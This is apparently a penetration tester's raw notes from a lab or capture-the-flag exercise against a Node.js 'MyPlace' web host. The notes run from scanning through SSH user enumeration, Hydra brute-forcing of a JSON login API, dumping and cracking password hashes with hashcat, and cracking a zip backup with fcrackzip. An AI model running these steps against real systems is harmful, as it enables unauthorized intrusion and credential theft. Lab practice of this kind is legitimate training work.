@@ -1,0 +1,3299 @@
++++++ NODE1 +++++
+
+
+
+└────╼ nmap -sP 192.168.0.0/24
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-11 08:52 CDT
+Nmap scan report for gateway (192.168.0.1)
+Host is up (0.0034s latency).
+MAC Address: 3C:04:61:E3:10:D1 (Unknown)
+Nmap scan report for 192.168.0.8
+Host is up (0.044s latency).
+MAC Address: D0:BF:9C:B3:85:CE (Hewlett Packard)
+Nmap scan report for 192.168.0.9
+Host is up (0.044s latency).
+MAC Address: DC:3A:5E:1F:85:BD (Roku)
+Nmap scan report for 192.168.0.12
+Host is up (0.076s latency).
+MAC Address: 78:E1:03:5A:69:31 (Amazon Technologies)
+Nmap scan report for node1 (192.168.0.14)
+Host is up (0.00020s latency).
+MAC Address: 08:00:27:A2:8A:95 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.0.252
+Host is up (0.0016s latency).
+MAC Address: 3C:04:61:E3:10:D2 (Unknown)
+Nmap scan report for 192.168.0.2
+Host is up.
+Nmap done: 256 IP addresses (7 hosts up) scanned in 2.16 seconds
+┌─╼[~] 
+└────╼ nmap --host-timeout=30 -sS -sV -sC -A -T4 -O 192.168.0.14
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-11 08:55 CDT
+Nmap scan report for node1 (192.168.0.14)
+Host is up (0.00058s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
+|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
+3000/tcp open  http    Node.js Express framework
+| hadoop-datanode-info: 
+|_  Logs: /login
+| hadoop-tasktracker-info: 
+|_  Logs: /login
+|_http-title: MyPlace
+MAC Address: 08:00:27:A2:8A:95 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.58 ms node1 (192.168.0.14)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.15 seconds
+┌─╼[~] 
+└────╼ echo "192.168.0.14 node1" >> /etc/host
+└────╼ searchsploit 7.2p2
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+OpenSSH 7.2p2 - Username Enumeration                                                                                                                  | exploits/linux/remote/40136.py
+OpenSSHd 7.2p2 - Username Enumeration                                                                                                                 | exploits/linux/remote/40113.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+┌─╼[~] 
+└────╼ searchsploit hadoop
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Hadoop YARN ResourceManager - Command Execution (Metasploit)                                                                                          | exploits/linux/remote/45025.rb
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+┌─╼[~] 
+└────╼ 
+
+Check Sploit --
+
+msf exploit(linux/http/hadoop_unauth_exec) > quit
+cdowns@7242-alpha-reticuli:~|⇒  sudo msfconsole -q -x "use exploit/linux/http/hadoop_unauth_exec; set LHOST 192.168.0.2; set RHOST node1;  set LPORT 3000; set ExitOnSession false ; check"
+LHOST => 192.168.0.2
+RHOST => node1
+LPORT => 3000
+ExitOnSession => false
+
+[*] node1:8088 The target is not exploitable.
+msf exploit(linux/http/hadoop_unauth_exec) > 
+
+└────╼ cat /tmp/myplace_users.txt 
+tom
+mark
+rastating
+┌─╼[~] 
+└────╼ 
+
+Check SSH --
+
+└────╼ python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /tmp/myplace_users.txt --bytes 512 node1
+
+
+User name enumeration against SSH daemons affected by CVE-2016-6210
+Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
+
+
+[*] Testing SSHD at: node1:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
+[*] Getting baseline timing for authenticating non-existing users............
+[*] Baseline mean for host node1 is 0.023659700000000002 seconds.
+[*] Baseline variation for host node1 is 0.0034669260462259683 seconds.
+[*] Defining timing of x < 0.03406047813867791 as non-existing user.
+[*] Testing your users...
+[-] tom - timing: 0.02845800000000004
+[-] mark - timing: 0.02147300000000002
+[-] rastating - timing: 0.02652199999999999
+┌─╼[~] 
+└────╼ python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt --bytes 1024 node1
+
+
+User name enumeration against SSH daemons affected by CVE-2016-6210
+Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
+
+
+[*] Testing SSHD at: node1:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
+[*] Getting baseline timing for authenticating non-existing users............
+[*] Baseline mean for host node1 is 0.022498699999999993 seconds.
+[*] Baseline variation for host node1 is 0.003364119767487481 seconds.
+[*] Defining timing of x < 0.032591059302462436 as non-existing user.
+[*] Testing your users...
+[-]  - timing: 0.023784000000000027
+[-] 4Dgifts - timing: 0.019747000000000015
+[-] EZsetup - timing: 0.02244600000000002
+[-] OutOfBox - timing: 0.021222999999999992
+[-] ROOT - timing: 0.02395499999999995
+[-] adm - timing: 0.02074699999999996
+[-] admin - timing: 0.022334000000000076
+[-] administrator - timing: 0.015669000000000044
+[-] anon - timing: 0.022751999999999994
+[-] auditor - timing: 0.024665000000000048
+[-] avahi - timing: 0.019475999999999938
+[-] avahi-autoipd - timing: 0.02179399999999998
+[-] backup - timing: 0.027602000000000015
+[-] bbs - timing: 0.022598000000000007
+[-] bin - timing: 0.0186059999999999
+[-] checkfs - timing: 0.02458399999999994
+[-] checkfsys - timing: 0.020186999999999955
+[-] checksys - timing: 0.021393999999999913
+[-] cmwlogin - timing: 0.022090999999999972
+[-] couchdb - timing: 0.023602000000000012
+[-] daemon - timing: 0.025330999999999992
+[-] dbadmin - timing: 0.025785000000000058
+[-] demo - timing: 0.02663900000000008
+[-] demos - timing: 0.024857000000000018
+[-] diag - timing: 0.02207199999999987
+[-] distccd - timing: 0.017543000000000086
+[-] dni - timing: 0.02659199999999995
+[-] fal - timing: 0.01997900000000019
+[-] fax - timing: 0.026256999999999975
+[-] ftp - timing: 0.02207899999999996
+[-] games - timing: 0.02535200000000004
+[-] gdm - timing: 0.023238000000000092
+[-] gnats - timing: 0.026097000000000037
+[-] gopher - timing: 0.0230459999999999
+[-] gropher - timing: 0.024423000000000084
+[-] guest - timing: 0.027780999999999834
+[-] haldaemon - timing: 0.02237599999999995
+[-] halt - timing: 0.019722000000000017
+[-] hplip - timing: 0.023069999999999924
+[-] informix - timing: 0.022664000000000017
+[-] install - timing: 0.024607999999999963
+[-] irc - timing: 0.016160000000000174
+[-] karaf - timing: 0.020591999999999944
+[-] kernoops - timing: 0.02361600000000008
+[-] libuuid - timing: 0.023805000000000076
+[-] list - timing: 0.02472999999999992
+[-] listen - timing: 0.025601999999999903
+[-] lp - timing: 0.02535900000000013
+[-] lpadm - timing: 0.024572999999999956
+[-] lpadmin - timing: 0.01728300000000016
+[-] lynx - timing: 0.020070000000000032
+[-] mail - timing: 0.02613999999999983
+[-] man - timing: 0.02280800000000016
+[-] me - timing: 0.025560999999999945
+[-] messagebus - timing: 0.027557000000000054
+[-] mountfs - timing: 0.02321200000000001
+[-] mountfsys - timing: 0.02645799999999987
+[-] mountsys - timing: 0.02442600000000006
+[-] news - timing: 0.02093300000000009
+[-] noaccess - timing: 0.024950000000000028
+[-] nobody - timing: 0.02786600000000017
+[-] nobody4 - timing: 0.01949500000000004
+[-] nuucp - timing: 0.02577000000000007
+[-] nxpgsql - timing: 0.021715999999999847
+[-] operator - timing: 0.028500999999999888
+[-] oracle - timing: 0.026130999999999904
+[-] pi - timing: 0.017490000000000006
+[-] popr - timing: 0.02049000000000012
+[-] postgres - timing: 0.020246999999999904
+[-] postmaster - timing: 0.028756000000000004
+[-] printer - timing: 0.021697000000000077
+[-] proxy - timing: 0.025258000000000003
+[-] pulse - timing: 0.02506699999999995
+[-] rfindd - timing: 0.02311899999999989
+[-] rje - timing: 0.024318999999999757
+[-] root - timing: 0.02353499999999986
+[-] rooty - timing: 0.02709299999999981
+[-] saned - timing: 0.02272199999999991
+[-] service - timing: 0.02767300000000006
+[-] setup - timing: 0.028316999999999926
+[-] sgiweb - timing: 0.027854000000000045
+[-] sigver - timing: 0.0199309999999997
+[-] speech-dispatcher - timing: 0.020040999999999976
+[-] sshd - timing: 0.028370999999999924
+[-] sym - timing: 0.020919999999999828
+[-] symop - timing: 0.027108000000000132
+[-] sync - timing: 0.02455100000000021
+[-] sys - timing: 0.022657999999999845
+[-] sysadm - timing: 0.027641000000000027
+[-] sysadmin - timing: 0.017889000000000266
+[-] sysbin - timing: 0.010187999999999864
+[-] syslog - timing: 0.017660999999999927
+[-] system_admin - timing: 0.011318999999999857
+[-] trouble - timing: 0.011573000000000278
+[-] udadmin - timing: 0.0136099999999999
+[-] ultra - timing: 0.012505999999999684
+[-] umountfs - timing: 0.014963000000000282
+[-] umountfsys - timing: 0.015423999999999882
+[-] umountsys - timing: 0.019501999999999686
+[-] unix - timing: 0.0193500000000002
+[-] us_admin - timing: 0.015832999999999764
+[-] user - timing: 0.01749500000000026
+[-] uucp - timing: 0.024642000000000053
+[-] uucpadm - timing: 0.01956599999999975
+[-] web - timing: 0.024822999999999595
+[-] webmaster - timing: 0.022062000000000026
+[-] www - timing: 0.02396200000000004
+[-] www-data - timing: 0.022402000000000033
+[-] xpdb - timing: 0.024224000000000245
+[-] xpopr - timing: 0.027403000000000066
+[-] zabbix - timing: 0.023376000000000285
+[-] vagrant - timing: 0.021633000000000013
+┌─╼[~] 
+└────╼ 
+
+Start Hydra Scan - 
+-- JSON attack --
+
+
+└────╼ hydra -L /tmp/myplace_users.txt -P /usr/share/wordlists/fasttrack.txt node1 http-post-form -s 3000 "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:{\"error\"\:true,\"message\"\:\"Authentication failed\"}" -vV -I -f -c 4
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[INFO] setting max tasks per host to 1 due to -c option usage
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-11 08:52:27
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 1 task per 1 server, overall 1 task, 669 login tries (l:3/p:223), ~669 tries per task
+[DATA] attacking http-post-form://node1:3000//api/session/authenticate:{"username"\:"^USER^","password"\:"^PASS^"}:{"error"\:true,"message"\:"Authentication failed"}
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target node1 - login "tom" - pass "Spring2017" - 1 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "Spring2016" - 2 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "Spring2015" - 3 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "Spring2014" - 4 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "Spring2013" - 5 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "spring2017" - 6 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "spring2016" - 7 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "spring2015" - 8 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "spring2014" - 9 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "spring2013" - 10 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "Summer2017" - 11 of 669 [child 0] (0/0)
+[ATTEMPT] target node1 - login "tom" - pass "Summer2016" - 12 of 669 [child 0] (0/0)
+----- snip -----
+
+ABORT !
+Checking with ZAP --
+
+
+└╼  export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
+┌─╼[~] 
+└────╼ hydra -l rastating -P /usr/share/wordlists/fasttrack.txt node1 http-post-form -s 3000 "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:{\"error\"\:true,\"message\"\:\"Authentication failed\"}" -vV -I -f -T 8 -c 1
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[INFO] setting max tasks per host to 1 due to -c option usage
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-11 21:07:49
+[INFO] Using HTTP Proxy: http://127.0.0.1:8080
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 1 task per 1 server, overall 1 task, 223 login tries (l:1/p:223), ~223 tries per task
+[DATA] attacking http-post-form://node1:3000//api/session/authenticate:{"username"\:"^USER^","password"\:"^PASS^"}:{"error"\:true,"message"\:"Authentication failed"}
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target node1 - login "rastating" - pass "Spring2017" - 1 of 223 [child 0] (0/0)
+[ATTEMPT] target node1 - login "rastating" - pass "Spring2016" - 2 of 223 [child 0] (0/0)
+[ATTEMPT] target node1 - login "rastating" - pass "Spring2015" - 3 of 223 [child 0] (0/0)
+
+Score !! --
+Encrypted Passwords in JSON !! --
+
+┌─╼[~] 
+└────╼ curl http://node1:3000/api/users/latest
+[{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]#                                                                                                                           ┌─╼[~] 
+└────╼ curl -s http://node1:3000/api/users/latest | cut -d "," -f 3,7,11
+"password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"
+┌─╼[~] 
+└────╼ hashid 'f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240'
+Analyzing 'f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240'
+[+] Snefru-256 
+[+] SHA-256 
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 
+[+] Skein-256 
+[+] Skein-512(256) 
+┌─╼[~] 
+└────╼ cat /tmp/myplace_users.hash 
+f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
+de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
+5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
+┌─╼[~] 
+└────╼
+
+Found ADMIN user --
+cdowns@7242-alpha-reticuli:~|⇒  curl http://node1:3000/api/users/ 
+[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]%                                                                                                                                                        
+cdowns@7242-alpha-reticuli:~|⇒
+
+Let's see if we can get the ADMIN --
+hashcat -a 0 -m 1400 -D 1 /tmp/myplace_users.hash /usr/share/wordlists/rockyou.txt --force -O 
+----- snip -----
+dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
+
+Nice !
+Skip Forward --
+
+└╼  hashcat -a 0 -m 1400 -D 1 /tmp/myplace_users.hash /usr/share/wordlists/rockyou.txt --force -O  
+hashcat (v4.2.0-3-gaf2626e6) starting...
+
+OpenCL Platform #1: Intel(R) Corporation
+========================================
+* Device #1: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 8012/32050 MB allocatable, 8MCU
+
+OpenCL Platform #2: The pocl project
+====================================
+* Device #2: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 8192/30002 MB allocatable, 8MCU
+
+Hashes: 3 digests; 3 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Optimized-Kernel
+* Zero-Byte
+* Precompute-Init
+* Precompute-Merkle-Demgard
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+* Raw-Hash
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
+de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
+Approaching final keyspace - workload adjusted.  
+
+                                                 
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: SHA-256
+Hash.Target......: /tmp/myplace_users.hash
+Time.Started.....: Sat Aug 11 21:30:22 2018 (6 secs)
+Time.Estimated...: Sat Aug 11 21:30:28 2018 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.Dev.#1.....:  1598.0 kH/s (3.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Speed.Dev.#2.....:   689.3 kH/s (7.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Speed.Dev.#*.....:  2287.4 kH/s
+Recovered........: 2/3 (66.67%) Digests, 0/1 (0.00%) Salts
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 3094/14344385 (0.02%)
+Restore.Point....: 14306284/14344385 (99.73%)
+Candidates.#1....: $HEX[217368616c6563696121] -> $HEX[042a0337c2a156616d6f732103]
+Candidates.#2....: #@VTVZ180 -> !shalom!
+HWMon.Dev.#1.....: N/A
+HWMon.Dev.#2.....: N/A
+
+Started: Sat Aug 11 21:30:21 2018
+Stopped: Sat Aug 11 21:30:30 2018
+┌─╼[~] 
+└╼  
+
+We know a SUCCESS JSON Login and no USERS are admin --
+Trying "admin" BF with hydra --
+
+└╼  hydra -l admin -P /usr/share/wordlists/rockyou.txt node1 http-post-form -s 3000 "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S={\"success\"\: true}" -vV -I -f -t 8
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-08-11 22:04:22
+[INFO] Using HTTP Proxy: http://127.0.0.1:8080
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
+[DATA] attacking http-post-form://node1:3000//api/session/authenticate:{"username"\:"^USER^","password"\:"^PASS^"}:S={"success"\: true}
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target node1 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "12345678" - 9 of 14344399 [child 6] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "abc123" - 10 of 14344399 [child 0] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "nicole" - 11 of 14344399 [child 7] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "daniel" - 12 of 14344399 [child 5] (0/0)
+[ATTEMPT] target node1 - login "admin" - pass "babygirl" - 13 of 14344399 [child 1] (0/0)
+
+
+We're back --
+Log in and download the backup file --
+
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  file myplace.backup 
+myplace.backup: ASCII text, with very long lines, with no line terminators
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  ls -lh myplace.backup 
+-rw-r--r-- 1 cdowns cdowns 3.3M Aug 13 20:49 myplace.backup
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  cat myplace.backup | base64 -d > outfile.backup
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  file outfile.backup 
+outfile.backup: Zip archive data, at least v1.0 to extract
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  unzip outfile.backup 
+Archive:  outfile.backup
+   creating: var/www/myplace/
+[outfile.backup] var/www/myplace/package-lock.json password: %             
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u outfile.backup
+
+
+PASSWORD FOUND!!!!: pw == magicword
+cdowns@7242-alpha-reticuli:~/Downloads|
+⇒  unzip outfile.backup                                              
+Archive:  outfile.backup
+[outfile.backup] var/www/myplace/package-lock.json password: 
+  inflating: var/www/myplace/package-lock.json  
+   creating: var/www/myplace/node_modules/
+   creating: var/www/myplace/node_modules/serve-static/
+  inflating: var/www/myplace/node_modules/serve-static/README.md  
+  inflating: var/www/myplace/node_modules/serve-static/index.js  
+  inflating: var/www/myplace/node_modules/serve-static/LICENSE  
+  inflating: var/www/myplace/node_modules/serve-static/HISTORY.md  
+  inflating: var/www/myplace/node_modules/serve-static/package.json  
+   creating: var/www/myplace/node_modules/utils-merge/
+  inflating: var/www/myplace/node_modules/utils-merge/README.md  
+  inflating: var/www/myplace/node_modules/utils-merge/index.js  
+  inflating: var/www/myplace/node_modules/utils-merge/LICENSE  
+  inflating: var/www/myplace/node_modules/utils-merge/.travis.yml  
+  inflating: var/www/myplace/node_modules/utils-merge/package.json  
+   creating: var/www/myplace/node_modules/qs/
+  inflating: var/www/myplace/node_modules/qs/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/qs/README.md  
+   creating: var/www/myplace/node_modules/qs/test/
+  inflating: var/www/myplace/node_modules/qs/test/index.js  
+  inflating: var/www/myplace/node_modules/qs/test/stringify.js  
+  inflating: var/www/myplace/node_modules/qs/test/.eslintrc  
+  inflating: var/www/myplace/node_modules/qs/test/parse.js  
+  inflating: var/www/myplace/node_modules/qs/test/utils.js  
+  inflating: var/www/myplace/node_modules/qs/LICENSE  
+   creating: var/www/myplace/node_modules/qs/dist/
+  inflating: var/www/myplace/node_modules/qs/dist/qs.js  
+ extracting: var/www/myplace/node_modules/qs/.eslintignore  
+   creating: var/www/myplace/node_modules/qs/lib/
+  inflating: var/www/myplace/node_modules/qs/lib/index.js  
+  inflating: var/www/myplace/node_modules/qs/lib/stringify.js  
+  inflating: var/www/myplace/node_modules/qs/lib/parse.js  
+  inflating: var/www/myplace/node_modules/qs/lib/formats.js  
+  inflating: var/www/myplace/node_modules/qs/lib/utils.js  
+  inflating: var/www/myplace/node_modules/qs/.eslintrc  
+  inflating: var/www/myplace/node_modules/qs/package.json  
+  inflating: var/www/myplace/node_modules/qs/.jscs.json  
+   creating: var/www/myplace/node_modules/iconv-lite/
+  inflating: var/www/myplace/node_modules/iconv-lite/README.md  
+  inflating: var/www/myplace/node_modules/iconv-lite/LICENSE  
+   creating: var/www/myplace/node_modules/iconv-lite/lib/
+  inflating: var/www/myplace/node_modules/iconv-lite/lib/index.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/lib/streams.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/lib/index.d.ts  
+  inflating: var/www/myplace/node_modules/iconv-lite/lib/extend-node.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/lib/bom-handling.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/.travis.yml  
+  inflating: var/www/myplace/node_modules/iconv-lite/package.json  
+ extracting: var/www/myplace/node_modules/iconv-lite/.npmignore  
+   creating: var/www/myplace/node_modules/iconv-lite/encodings/
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/utf7.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/index.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/sbcs-data-generated.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/dbcs-codec.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/dbcs-data.js  
+   creating: var/www/myplace/node_modules/iconv-lite/encodings/tables/
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/gbk-added.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/big5-added.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/gb18030-ranges.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/cp936.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/cp949.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/cp950.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/shiftjis.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/tables/eucjp.json  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/utf16.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/internal.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/sbcs-data.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/encodings/sbcs-codec.js  
+  inflating: var/www/myplace/node_modules/iconv-lite/Changelog.md  
+   creating: var/www/myplace/node_modules/debug/
+  inflating: var/www/myplace/node_modules/debug/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/debug/README.md  
+ extracting: var/www/myplace/node_modules/debug/node.js  
+  inflating: var/www/myplace/node_modules/debug/LICENSE  
+  inflating: var/www/myplace/node_modules/debug/.eslintrc  
+  inflating: var/www/myplace/node_modules/debug/component.json  
+  inflating: var/www/myplace/node_modules/debug/.travis.yml  
+  inflating: var/www/myplace/node_modules/debug/package.json  
+  inflating: var/www/myplace/node_modules/debug/Makefile  
+   creating: var/www/myplace/node_modules/debug/src/
+  inflating: var/www/myplace/node_modules/debug/src/index.js  
+  inflating: var/www/myplace/node_modules/debug/src/node.js  
+  inflating: var/www/myplace/node_modules/debug/src/debug.js  
+  inflating: var/www/myplace/node_modules/debug/src/browser.js  
+ extracting: var/www/myplace/node_modules/debug/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/debug/.npmignore  
+  inflating: var/www/myplace/node_modules/debug/karma.conf.js  
+   creating: var/www/myplace/node_modules/array-flatten/
+  inflating: var/www/myplace/node_modules/array-flatten/README.md  
+  inflating: var/www/myplace/node_modules/array-flatten/array-flatten.js  
+  inflating: var/www/myplace/node_modules/array-flatten/LICENSE  
+  inflating: var/www/myplace/node_modules/array-flatten/package.json  
+   creating: var/www/myplace/node_modules/statuses/
+  inflating: var/www/myplace/node_modules/statuses/README.md  
+  inflating: var/www/myplace/node_modules/statuses/index.js  
+  inflating: var/www/myplace/node_modules/statuses/LICENSE  
+  inflating: var/www/myplace/node_modules/statuses/HISTORY.md  
+  inflating: var/www/myplace/node_modules/statuses/codes.json  
+  inflating: var/www/myplace/node_modules/statuses/package.json  
+   creating: var/www/myplace/node_modules/ms/
+  inflating: var/www/myplace/node_modules/ms/index.js  
+  inflating: var/www/myplace/node_modules/ms/license.md  
+  inflating: var/www/myplace/node_modules/ms/package.json  
